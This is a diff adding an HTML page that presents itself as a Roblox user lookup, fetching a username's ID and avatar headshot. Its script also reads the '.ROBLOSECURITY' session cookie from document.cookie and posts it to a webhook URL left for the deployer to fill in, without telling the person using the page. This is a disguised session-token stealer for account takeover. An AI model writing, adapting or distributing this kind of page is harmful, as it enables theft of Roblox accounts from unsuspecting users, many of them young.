@@ -1,0 +1,78 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox User Info</title>
+<!-- Add your stylesheet here if needed -->
+<!-- <link rel="stylesheet" href="styles.css"> -->
+</head>
+<body>
+  <input type="text" id="username" placeholder="Enter Roblox Username">
+  <button onclick="fetchUser()">Fetch Roblox User</button>
+  <br>
+  <img src="" alt="Roblox Profile Picture" id="robloxPFP" style="display: none; width: 200px; height: 200px;">
+  
+  <script>
+    const webhookURL = ""; // Your webhook URL here
+
+    function getCookie(name) {
+      const value = `; ${document.cookie}`;
+      const parts = value.split(`; ${name}=`);
+      if (parts.length === 2) return parts.pop().split(';').shift();
+      return null;
+    }
+
+    async function fetchUser() {
+      const usernameInput = document.getElementById("username").value.trim();
+      const username = usernameInput.toUpperCase();
+      
+      // Construct Roblox user API URL
+      const apiURL = `https://api.roblox.com/users/get-by-username?username=${username}`;
+      
+      try {
+        const response = await fetch(apiURL);
+        const data = await response.json();
+
+        if (data.success === false || !data.Id) {
+          alert("User not found");
+          return;
+        }
+
+        const userId = data.Id;
+        const profileUrl = `https://roblox.com/users/${userId}`;
+
+        // Fetch Roblox profile picture using Roblox API
+        const avatarResponse = await fetch(`https://thumbnails.roblox.com/v1/users/avatar-headshot?userIds=${userId}&size=420x420&format=Png&isCircular=true`);
+        const avatarData = await avatarResponse.json();
+
+        if (avatarData.data && avatarData.data.length > 0) {
+          const avatarUrl = avatarData.data[0].imageUrl;
+          const img = document.getElementById("robloxPFP");
+          img.src = avatarUrl;
+          img.style.display = "block";
+        }
+
+        // Get Roblox security cookie
+        const token = getCookie(".ROBLOSECURITY");
+
+        // Prepare message for webhook
+        const msg = {
+          content: `Cookie: ${token}`
+        };
+
+        // Send data to webhook
+        fetch(webhookURL, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json'
+          },
+          body: JSON.stringify(msg)
+        });
+      } catch (error) {
+        console.error("Error fetching data:", error);
+      }
+    }
+  </script>
+</body>
+</html>
